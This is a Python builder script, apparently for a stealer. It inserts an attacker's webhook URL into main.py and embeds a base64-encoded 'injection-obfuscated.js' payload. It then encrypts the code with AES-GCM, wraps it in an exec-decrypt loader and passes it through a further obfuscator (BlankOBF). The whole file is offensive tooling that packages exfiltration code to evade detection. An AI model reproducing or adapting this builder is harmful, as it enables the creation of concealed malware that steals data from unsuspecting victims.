import subprocess, random, pyaes, base64
with open('webhook.txt') as file:
    webhook = file.read().strip()

with open('main.py') as file:
    code = file.readlines()

for index, value in enumerate(code):
    if 'faxxhookxxx' in value:
        code[index] = "WEBHOOK = '{}'".format(webhook)
        break

code = '\n'.join(code)
with open("injection-obfuscated.js", "rb") as injectionFile:
    injectionCode = base64.b64encode(injectionFile.read()).decode()

code = code.replace("%injectionbase64encoded%", injectionCode)

key, iv = random.randbytes(32), random.randbytes(12)
encrypted = base64.b64encode(pyaes.AESModeOfOperationGCM(key, iv).encrypt(code)).decode()

key, iv = base64.b64encode(key).decode(), base64.b64encode(iv).decode()
code = f"import pyaes, base64; exec(compile(pyaes.AESModeOfOperationGCM(base64.b64decode({repr(key)}.encode()), base64.b64decode({repr(iv)}.encode())).decrypt(base64.b64decode({repr(encrypted)}.encode())), '<string>', 'exec'))"
with open('main-o.py', 'w') as file:
    file.write(code)
subprocess.run('python BlankOBF.py main-o.py -o main-o.py', shell= True, capture_output= True)